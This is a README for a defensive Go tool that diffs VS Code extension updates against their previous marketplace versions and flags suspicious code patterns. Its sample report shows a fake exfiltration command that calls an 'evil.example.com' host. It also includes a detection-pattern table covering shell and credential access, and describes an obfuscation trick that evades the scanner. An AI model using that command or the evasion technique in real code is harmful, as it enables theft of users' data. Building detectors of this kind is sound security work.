# extwatch

A small Go CLI that watches your VS Code extensions directory and, whenever an
extension is **installed or updated**, inspects the new code for suspicious
patterns — shelling out, dynamic code evaluation, credential/path access, and
network calls. It compares the new version against the **previous** version
pulled from the VS Code marketplace, so it flags what an update *introduced*
rather than nagging about long-standing benign code.

> ⚠️ This is a learning-oriented **v0.1**. It is detection-only (it never blocks
> an install), uses static pattern matching (no runtime sandboxing), and is
> intended to raise a "take a closer look" signal — not to be a definitive
> verdict on whether an extension is malicious.

## How it works

```
fsnotify (~/.vscode/extensions)
        │  new/changed "publisher.name-version" directory
        ▼
   watcher  ── debounce ──▶ extension.Extension{publisher, name, version, dir}
        ▼
   fetcher  1. read local (current) .js + package.json from disk
            2. query marketplace for version history
            3. pick the version just before the local one
            4. download + unzip that .vsix, extract its .js + package.json
        ▼
   analyzer scan both versions for dangerous patterns;
            keep a match only if it is in a NEW file, on a NEW line,
            or (minified) a pattern absent from the old version;
            assign severity + an aggregate risk score
        ▼
   notifier HIGH finding  -> desktop notification + full report
            MEDIUM / LOW  -> terminal report only
            nothing       -> silent
```

## Setup

Requires Go 1.21+ (developed on 1.26).

```bash
git clone <your-fork-url> extwatch
cd extwatch
go build -o extwatch ./cmd/extwatch
```

This produces a single self-contained binary. The only third-party
dependencies are Go modules:

- [`github.com/fsnotify/fsnotify`](https://github.com/fsnotify/fsnotify) — cross-platform filesystem watching
- [`github.com/gen2brain/beeep`](https://github.com/gen2brain/beeep) — cross-platform desktop notifications

## Usage

```bash
# Watch the default ~/.vscode/extensions and run until Ctrl-C
./extwatch

# Point at a different extensions directory (e.g. VS Code Insiders, or a fixture)
./extwatch --dir ~/.vscode-insiders/extensions
```

Leave it running in a terminal (or as a background service). Install or update
an extension in VS Code as usual; if anything noteworthy appears in the update,
extwatch prints a report and — for HIGH findings — pops a desktop notification.

### Example report

```
┌─ extwatch report: dustypomerleau.rust-syntax@0.6.1
│  comparing against previous version 0.6.0
│  showing patterns introduced by this update
│  risk score: 46   highest severity: HIGH   findings: 6
│
│  [HIGH] child_process — Imports Node's child_process module (run OS commands)
│      evil.js:1
│        const cp = require('child_process');
│  [HIGH] exec( — Calls exec() to run a shell command
│      evil.js:2
│        cp.exec('curl https://evil.example.com/exfil');
│  ...
└─
```

## What it detects

| Pattern | Severity | Why it matters |
|---|---|---|
| `child_process` | **HIGH** | Importing Node's process module — gateway to running OS commands |
| `exec(` † | **HIGH** | Runs a shell command |
| `execSync(` † | **HIGH** | Runs a shell command synchronously |
| `spawn(` † | **HIGH** | Spawns a child process |
| `eval(` | **HIGH** | Executes a string as code |
| `new Function(` | **HIGH** | Builds a function from a string (eval-equivalent) |
| `.ssh` | **HIGH** | Touches the user's SSH key directory |
| `.aws` | **HIGH** | Touches the user's AWS credentials directory |
| `USERPROFILE` | **HIGH** | Reads the Windows home/profile path |
| `process.env` | MEDIUM | Reads environment variables (often secrets) |
| `fetch(` | MEDIUM | Outbound HTTP request |
| `WebSocket` | MEDIUM | Opens a WebSocket connection |
| outbound URL (`http(s)://…`) | MEDIUM | Hard-coded remote endpoint |
| `clipboard` | LOW | Reads/writes the system clipboard |

† **Contextual:** `exec`/`execSync`/`spawn` are only flagged in files that also
import `child_process`. Without this, innocent `regex.exec(...)` calls (a RegExp
method, common in minified libraries like d3) would produce a flood of false
positives.

It also reads **`package.json`** and flags, when an update adds them:

| Manifest check | Severity | Why it matters |
|---|---|---|
| `postinstall` / `preinstall` / `install` script | **HIGH** | Code that runs automatically on `npm install` — the classic npm supply-chain vector |
| `prepare` / `prepublish` script | MEDIUM | Also auto-runs during install/publish |
| `activationEvents: "*"` | MEDIUM | Extension activates eagerly on every startup |
| `activationEvents: "onStartupFinished"` | LOW | Extension runs code shortly after each launch (stealth-friendly) |

**Risk score** is a coarse aggregate: each *distinct* introduced pattern adds
its severity weight (HIGH=10, MEDIUM=3, LOW=1). It's a rough "how much new
attack surface did this update add" indicator, not a calibrated metric.

### How "introduced" is decided

The diff is what keeps extwatch quiet on benign updates. A match in the new
version is reported only when it is genuinely new, decided per finding:

1. **New file** — it lives in a file that didn't exist in the previous version.
2. **New line** (readable code) — its exact line text isn't anywhere in the
   previous version. This catches a malicious *new call site* of a pattern the
   extension already used (e.g. a fresh `spawn('/bin/sh')` next to a legitimate
   `spawn(serverPath)`), which a coarse "is this pattern anywhere in the old
   version?" check would miss.
3. **Pattern absent** (minified mega-line, >300 chars) — line-level diffing is
   meaningless when a whole bundle is one line, so for those we fall back to
   reporting only patterns that were entirely absent before. This avoids
   flagging every pattern in a bundle whenever a benign minified build changes.

The tradeoff: rules 1–2 will occasionally fire on benign refactors (a renamed
variable on a matching line, a moved file). That's intentional — for a security
tool, a few false positives beat a missed malicious update.

### Notification policy

- **Any HIGH** introduced finding → desktop notification **and** full terminal report.
- **MEDIUM / LOW only** → terminal report, no notification.
- **Nothing introduced** → completely silent.

When there is no marketplace baseline (a brand-new install, or the previous
`.vsix` couldn't be downloaded), extwatch falls back to scanning the **entire**
new install and reports everything it finds, noting that no baseline was used.

## Architecture

Standard Go application layout: the entry point lives under `cmd/`, and each
concern is its own package under `internal/` (so nothing here can be imported by
other modules). The shared `Extension` type sits in its own dependency-free
package to avoid an import cycle.

```
cmd/extwatch/main.go     entry point: flags, signals, the per-change pipeline
internal/
  extension/             the Extension domain type + directory-name parsing
  watcher/               fsnotify setup, debouncing, emits extension.Extension
  fetcher/               marketplace queries, version selection, vsix + js extraction
  analyzer/              pattern catalogue, scanning, new-vs-old diff, scoring
  notifier/              notification policy: terminal report + desktop popup
```

Dependency direction is one-way: `watcher`, `fetcher`, and `analyzer` each
import only `extension`; `notifier` imports `analyzer`; `main` wires them all
together. Tests live beside the package they cover —
`extension` (parsing), `fetcher` (version selection), and `analyzer` (the diff).

Run the tests with:

```bash
go test ./...
```

## Simulating a bad actor

`simulate.sh` lets you watch extwatch catch a malicious update **without
touching your real `~/.vscode/extensions`**. The realistic threat isn't a
brand-new shady extension — it's a *trusted extension you already have whose
update smuggles in malware*. The script clones one of your real installed
extensions into a throwaway watch dir (so the marketplace baseline lookup
succeeds against the genuine previous version) and injects an attacker payload.

The payloads are inert detection fixtures: they point at `example.com` (a
reserved, non-routable domain) and land in a temp dir VS Code never loads —
nothing executes or exfiltrates.

```bash
PAYLOAD=exfil      ./simulate.sh vscodevim.vim-1.32.4   # credential theft (HIGH + notification)
PAYLOAD=shell      ./simulate.sh <ext-dir-name>          # reverse shell / command exec (HIGH)
PAYLOAD=loader     ./simulate.sh <ext-dir-name>          # staged remote-code loader (HIGH)
PAYLOAD=wallet     ./simulate.sh <ext-dir-name>          # clipboard stealer (LOW — report, no popup)
PAYLOAD=minified   ./simulate.sh <ext-dir-name>          # same attack, minified one-liner
PAYLOAD=obfuscated ./simulate.sh <ext-dir-name>          # EVASION — slips past (false negative)
PAYLOAD=clean      ./simulate.sh <ext-dir-name>          # no injection — stays silent
```

The `obfuscated` profile is worth running: it builds the dangerous identifiers
at runtime (`["child","process"].join("_")`, a base64-decoded `require`) so the
literal patterns never appear in source, and extwatch — a regexp scanner, not an
AST parser — stays silent. That's the honest false-negative boundary.

## Known limitations (v0.1)

These are intentionally **out of scope** for this version and documented rather
than solved:

- **Minified JS.** Most published extensions ship bundled/minified JavaScript.
  Pattern matching still works (the strings are present), but line numbers and
  snippets are far less useful when a file is one giant line, and obfuscation
  (e.g. building `"child_" + "process"` at runtime) can hide patterns entirely.
- **Static analysis only.** extwatch reads source; it never executes the
  extension, so it cannot observe actual runtime behaviour, dynamically
  constructed calls, or network traffic.
- **Detection only — no blocking.** It alerts you *after* an update lands; it
  does not prevent installation or quarantine the extension.
- **Pattern matching, not parsing.** It greps for substrings/regexps rather than
  parsing an AST, so it has both false positives (a URL in a comment) and false
  negatives (obfuscated calls). The new-vs-old diff mitigates the noise but
  doesn't eliminate it.
- **Single marketplace assumption.** It queries the official VS Code
  marketplace. Extensions installed from `.vsix` files or alternate registries
  (e.g. Open VSX) won't have a comparable baseline and fall back to a full scan.
- **Memory-bounded reads.** Individual `.js` files are read up to 8 MiB and the
  whole `.vsix` is buffered in memory; pathologically large packages are
  truncated.

## Possible next steps

- Resolve obfuscated/concatenated patterns via lightweight AST parsing.
- Maintain a local cache of vetted versions to avoid re-downloading.
- Add an allowlist for known-good publishers/patterns to cut noise.
- Optional quarantine: move a flagged update aside pending review.
